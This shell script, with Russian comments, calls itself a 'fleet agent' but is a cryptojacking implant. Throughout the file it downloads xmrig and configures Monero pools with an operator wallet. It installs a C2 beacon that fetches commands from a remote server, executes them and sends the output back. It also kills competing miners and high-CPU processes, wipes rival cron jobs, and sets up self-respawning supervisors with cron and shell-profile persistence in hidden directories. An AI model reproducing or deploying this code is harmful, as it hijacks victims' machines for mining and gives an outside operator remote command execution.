#!/bin/sh
# fleet-agent.sh — агент для флотских хостов. Версия 2: паритет с их инсталлером.
#
# Что взято у них: выбор рабочего каталога, проверка архитектуры по ELF, несколько
# зеркал доставки, http без curl, зачистка конкурентов, single-miner, чистка чужих
# cron, снятие suid с crontab, уборка транспорта, отметка .inst, права на артефакты.
# Что наше: C2-поллинг с очередью, потолок CPU по числу ядер, имена воркеров.
#
# Ставится: sh fleet-agent.sh <c2_url> <worker_id>
# env: KF_CP2 KF_HINT KF_NICE KF_MINER KF_POOL KF_WALLET KF_TCP KF_SWEEP KF_FULL_WIPE

set -u
C2="${1:-}"
WID="${2:-x}"
CP2="${KF_CP2:-$C2}"
NICE="${KF_NICE:-19}"
POOL="${KF_POOL:-gulf.moneroocean.stream:20004}"
WALLET="${KF_WALLET:-}"
SWEEP="${KF_SWEEP:-1}"

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" 2>/dev/null && pwd)
LIB="$HERE/lib"
[ -d "$LIB" ] || LIB="$HERE"
# деплойер кладёт библиотеки в /var/tmp/.kf, агент — в /tmp/.k.sh: подхватываем
[ -f "$LIB/00-common.sh" ] || { [ -f /var/tmp/.kf/00-common.sh ] && LIB=/var/tmp/.kf; }
for _m in 00-common 10-exclude 20-sweep 25-patch 26-antiunicorn 30-single 40-transport 45-dialer 50-cron 60-harden 70-fetch; do
  [ -f "$LIB/$_m.sh" ] && . "$LIB/$_m.sh"
done

command -v kf_find_workdir >/dev/null 2>&1 || { echo "KF_FATAL: библиотеки не загружены (LIB=$LIB)" >&2; exit 1; }

# --- идентичность и каталоги -------------------------------------------------
KF_SFX=$(kf_load_or_gen_sfx)
[ -n "${KF_SFX:-}" ] || KF_SFX=$(printf '%04x' $$ 2>/dev/null || echo 0001)
KF_MD_DIR="d$KF_SFX"
KF_MD_BIN="b$KF_SFX"
KF_ID="$WID"
KF_WALLET="$WALLET"
KF_POOL="$POOL"
KF_MARK="${KF_MARK:-kf9}"

if [ -d /var/tmp/.kf ] && [ -w /var/tmp/.kf ] && [ -f /var/tmp/.kf/00-common.sh ]; then
  KF_ROOT=/var/tmp/.kf
else
  KF_ROOT=$(kf_find_workdir "$KF_SFX")
fi
[ -n "$KF_ROOT" ] || KF_ROOT=/var/tmp/.kf
D="$KF_ROOT"
S=/dev/shm/.kf
KF_STATE_DIR=$(kf_state_dir 2>/dev/null || echo "$D")
KF_STATE_HOME="$KF_STATE_DIR"
mkdir -p "$D" "$S" 2>/dev/null || true
chmod 700 "$D" "$S" 2>/dev/null || true

printf '%s' "$WID" > "$D/id" 2>/dev/null;      chmod 600 "$D/id" 2>/dev/null
printf '%s' "$CP2" > "$D/c2list" 2>/dev/null;  chmod 600 "$D/c2list" 2>/dev/null

# убрать прошлые генерации, чтобы не плодить копии
kf_retire_stale_identities 2>/dev/null
kf_kill_stale_generation 2>/dev/null

CORES=$(kf_cpu_count); CORES=${CORES:-1}
THREADS="${KF_THREADS:-$(kf_threads_for_cores "$CORES")}"
HINT="${KF_HINT:-$(kf_hint_for_cores "$CORES")}"
kf_log "cores=$CORES threads=$THREADS root=$D ec2=$(kf_is_ec2 && echo yes || echo no)"

# --- майнер: архитектура, зеркала, проверка ELF ------------------------------
ARCH=$(kf_arch); MACHINE=$(echo "$ARCH" | awk '{print $2}')
ARCH=$(echo "$ARCH" | awk '{print $1}')
MO_STATIC_X64="https://raw.githubusercontent.com/WesternJapan/xmrig-static/main/xmrig-x86_64"
C3_STATIC="https://github.com/C3Pool/xmrig-C3/releases/download/v6.26.0-C7/xmrig-v6.26.0-C7-linux-Static.tar.gz"
case "$ARCH" in
  x86_64)
    URLS="${KF_MINER:-$MO_STATIC_X64} $MO_STATIC_X64 ${KF_MIRROR_URL:-}" ;;
  aarch64|armv7)
    URLS="${KF_MINER_ARM:-} ${KF_MIRROR_URL:-}" ;;
  *)
    kf_log "архитектура $ARCH неизвестна — майнер не ставим"; URLS="" ;;
esac

if [ ! -x "$D/xmrig" ] && [ -n "$URLS" ] && [ -n "$MACHINE" ]; then
  # shellcheck disable=SC2086
  kf_fetch_miner "$D/xmrig" "$ARCH" "$MACHINE" $URLS || kf_log "доставка не удалась"
fi
if [ -x "$D/xmrig" ]; then
  cp "$D/xmrig" "$S/xmrig" 2>/dev/null
  kf_mark_identity "$D/xmrig"
  kf_miner_ready "$D/xmrig" && kf_log "miner: готов (ELF + размер)" || kf_log "miner: подозрительный (проверь вручную)"
fi

# --- конфиг ------------------------------------------------------------------
if [ ! -s "$D/c.json" ]; then
  cat > "$D/c.json" <<EOF
{
  "api": { "id": null, "worker-id": "$WID" },
  "http": { "enabled": false },
  "autosave": false,
  "background": false,
  "colors": false,
  "log-file": "$D/m.log",
  "donate-level": 0,
  "cpu": { "enabled": true, "huge-pages": true, "priority": null, "yield": true, "asm": true },
  "pools": [
    { "algo": null, "coin": "monero", "url": "$POOL", "user": "$WALLET.$WID", "pass": "x",
      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true, "sni": true },
    { "algo": null, "coin": "monero", "url": "gulf.moneroocean.stream:10004", "user": "$WALLET.$WID", "pass": "x",
      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": false },
    { "algo": "rx/0", "coin": "monero", "url": "mine.c3pool.com:443", "user": "$WALLET.$WID", "pass": "x",
      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": false },
    { "algo": "rx/0", "coin": "monero", "url": "mine.c3pool.com:33333", "user": "$WALLET.$WID", "pass": "x",
      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true }
  ],
  "pause-on-active": 0,
  "pause-on-battery": false,
  "print-time": 60,
  "retries": 5,
  "retry-pause": 10
}
EOF
  chmod 600 "$D/c.json"
  cp "$D/c.json" "$S/c.json" 2>/dev/null || true
fi
printf '%s' "--threads=$THREADS --log-file=$D/xm.log" > "$D/flags"; chmod 600 "$D/flags"

# --- бекон: поллинг C2 -------------------------------------------------------
cat > "$D/beacon.sh" <<'BS'
#!/bin/sh
D=/var/tmp/.kf
ID="$1"; shift
for c2 in "$@"; do
  [ -n "$c2" ] || continue
  cmd=$(curl -fsS -m 15 "$c2/p?id=$ID" 2>/dev/null) || continue
  [ -z "$cmd" ] && continue
  out=$(sh -c "$cmd" 2>&1 | base64 2>/dev/null | tr -d '\n')
  curl -fsS -m 20 -H 'content-type: application/json' \
    -d "{\"id\":\"$ID\",\"out\":\"$out\"}" "$c2/o" >/dev/null 2>&1
  break
done
BS
chmod 700 "$D/beacon.sh"

cat > "$D/loop.sh" <<'LP'
#!/bin/sh
D=/var/tmp/.kf
while :; do
  sh "$D/beacon.sh" "$@"
  j=$(od -An -N1 -tu1 /dev/urandom 2>/dev/null | tr -d ' \n'); case "$j" in ''|*[!0-9]*) j=0 ;; esac
  sleep $(( 10 + j % 30 ))
done
LP
chmod 700 "$D/loop.sh"

# --- их self-dialer: канал без cron (только не-root) -------------------------
printf '%s\n%s\n' "$D/xmrig" "--threads=$THREADS --log-file=$D/xm.log" > "$D/.beacon-job.path" 2>/dev/null
kf_install_self_dialer "$D" "$C2" 2>/dev/null

# --- супервизор --------------------------------------------------------------
cat > "$D/svc.sh" <<'SV'
#!/bin/sh
D=/var/tmp/.kf; S=/dev/shm/.kf; R="${1:-m}"
alm(){ for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
for p in /proc/[0-9]*; do pid=${p#/proc/}; [ "$pid" = "$$" ] && continue
  c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline")
  # точное совпадение, а не подстрока: иначе внешний "sh -c ...svc.sh m..." глушит запуск
  case "$c" in "sh $D/svc.sh $R "*|"$D/svc.sh $R "*) exit 0;; esac
done
case "$R" in
m)
  while :; do
    if [ -s "$D/c.json" ] && ! alm "$D/xmrig -c"; then
      [ -x "$D/xmrig" ] || { cp "$S/xmrig" "$D/xmrig" 2>/dev/null; chmod 700 "$D/xmrig" 2>/dev/null; }
      [ -x "$D/xmrig" ] && setsid nice -n 19 "$D/xmrig" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null) >/dev/null 2>&1 &
    fi
    alm "$D/svc.sh g" || setsid "$D/svc.sh" g >/dev/null 2>&1 &
    sleep 30
  done ;;
g)
  while :; do
    if [ -s "$D/c.json" ] && ! alm "$D/xmrig -c"; then
      [ -x "$D/xmrig" ] && setsid nice -n 19 "$D/xmrig" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null) >/dev/null 2>&1 &
    fi
    alm "$D/svc.sh m" || setsid "$D/svc.sh" m >/dev/null 2>&1 &
    sleep 45
  done ;;
esac
SV
chmod 700 "$D/svc.sh"

# --- зачистка: цикл ----------------------------------------------------------
cat > "$D/sweep.sh" <<'SW'
#!/bin/sh
D=/var/tmp/.kf
for m in 00-common 10-exclude 20-sweep 25-patch 26-antiunicorn 30-single 40-transport 50-cron 60-harden 70-fetch; do
  [ -f "$D/$m.sh" ] && . "$D/$m.sh"
done
KF_ROOT="$D"; KF_MD_DIR="$1"; KF_MD_BIN="$2"; KF_ID="$3"
while :; do
  kf_sweep_competitors 2>/dev/null
  kf_disarm_competitor 2>/dev/null
  kf_kill_themf 9 2>/dev/null
  kf_kill_mf3 2>/dev/null
  kf_kill_known_miners 2>/dev/null
  kf_kill_high_cpu 2>/dev/null
  kf_enforce_single_miner 2>/dev/null
  kf_purge_rival_binaries 2>/dev/null
  kf_patch_rival_configs 2>/dev/null
  kf_detect_kill_unicorn 2>/dev/null
  kf_scrub_competitor_crons 2>/dev/null
  sleep 60
done
SW
chmod 700 "$D/sweep.sh"

# пути в сгенерированных скриптах приводим к фактическому каталогу
for _g in loop.sh svc.sh sweep.sh beacon.sh; do
  [ -f "$D/$_g" ] && sed -i "s|/var/tmp/\.kf|$D|g; s|/dev/shm/\.kf|$D|g" "$D/$_g" 2>/dev/null
done

# --- запуск ------------------------------------------------------------------
alm_running() { for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }

alm_running "$D/svc.sh m" || setsid sh "$D/svc.sh" m >/dev/null 2>&1 &
alm_running "$D/svc.sh g" || setsid sh "$D/svc.sh" g >/dev/null 2>&1 &
alm_running "$D/loop.sh"  || setsid sh "$D/loop.sh" "$WID" $CP2 >/dev/null 2>&1 &
if [ "$SWEEP" = "1" ]; then
  alm_running "$D/sweep.sh" || setsid sh "$D/sweep.sh" "$KF_MD_DIR" "$KF_MD_BIN" "$WID" >/dev/null 2>&1 &
fi

if [ -x "$D/guardian.sh" ]; then
  alm_running "$D/guardian.sh" || setsid sh "$D/guardian.sh" >/dev/null 2>&1 &
fi
if [ -x "$D/status.sh" ]; then
  alm_running "$D/status.sh --watch" || setsid sh "$D/status.sh" --watch >/dev/null 2>&1 &
fi

if [ -n "${KF_TCP:-}" ] && [ -x "$D/dialer.sh" ]; then
  printf '%s' "$KF_TCP" > "$D/endpoint" 2>/dev/null
  alm_running "$D/dialer.sh watch" || setsid sh "$D/dialer.sh" watch "$KF_TCP" "$WID" >/dev/null 2>&1 &
fi

if [ -x "$D/cron_persist.sh" ] && [ ! -f "$D/.cron_done" ]; then
  kf_wipe_previous_crons 2>/dev/null
  sh "$D/cron_persist.sh" >/dev/null 2>&1
  kf_create_cronjob "$D" 2>/dev/null
  : > "$D/.cron_done"
fi

# разовая уборка при установке — как у них в конце инсталляции
kf_cleanup_competitor_files 2>/dev/null
kf_sweep_old_beacons "$D/loop.sh" 2>/dev/null
kf_cleanup_transport 2>/dev/null
kf_harden_crontab_gate 2>/dev/null
kf_retire_legacy_guardians 2>/dev/null
kf_add_profile_persist "$D" 2>/dev/null
[ -n "${KF_HARDEN:-}" ] && { kf_harden_artifacts 2>/dev/null; kf_harden_network 2>/dev/null; }

sleep 2
echo "KF_STATE: miner=$(kf_miner_running xmrig && echo RUN || echo NO) svc=$(alm_running "$D/svc.sh m" && echo OK || echo NO) beacon=$(alm_running "$D/loop.sh" && echo OK || echo NO) sweep=$(alm_running "$D/sweep.sh" && echo OK || echo NO) cores=$CORES threads=$THREADS nice=$NICE"
